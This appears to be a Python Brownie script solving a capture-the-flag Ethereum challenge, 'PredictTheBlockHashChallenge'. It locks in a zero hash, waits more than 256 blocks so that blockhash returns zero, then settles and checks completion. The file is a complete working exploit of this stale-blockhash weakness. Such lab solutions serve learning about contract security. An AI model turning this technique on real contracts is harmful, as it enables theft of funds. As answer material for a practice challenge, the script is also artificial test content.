import sys
from dotenv import dotenv_values
PROJECT_SCRIPTS_PATH = dotenv_values(".env")["CTF_PROJECT_PATH"] + "/scripts/"
PROJECT_BUILD_PATH = dotenv_values(".env")["CTF_PROJECT_PATH"] + "/build/"
sys.path.insert(1, PROJECT_SCRIPTS_PATH)
from helpful_scripts import get_account, padHexTo32Bytes
from brownie import Contract
from web3 import Web3
import json
PUBLIC_KEY = dotenv_values(".env")["PUBLIC_KEY"]


def main():
    ###########
    # SETUP
    ###########
    with open(PROJECT_BUILD_PATH + "contracts/PredictTheBlockHashChallenge.json") as f:
        info_json = json.load(f)
    Challenge_ABI = info_json["abi"]
    Challenge_Address = "0x385650AaC774819abe4092FE09dd746be187Ce55"
    challengeContract = Contract.from_abi(name="", address=Challenge_Address,abi=Challenge_ABI)
    account = get_account()

    ###########
    # SOLVING
    ###########
    # print(padHexTo32Bytes(Web3.toHex(0)[2:], 'upper'))
    lock_tx = challengeContract.lockInGuess(padHexTo32Bytes(Web3.toHex(0)[2:], 'upper'), {"from":account, "value": Web3.toWei(1,'ether')})
    lock_tx.wait(258)
    settle_tx = challengeContract.settle({"from": account, "gas_limit": 100_000})
    settle_tx.wait(1)

    ###########
    # CHECKING
    ###########
    isComplete = challengeContract.isComplete()
    print(isComplete)

    print('Finished')

if __name__ == "__main__":
    main()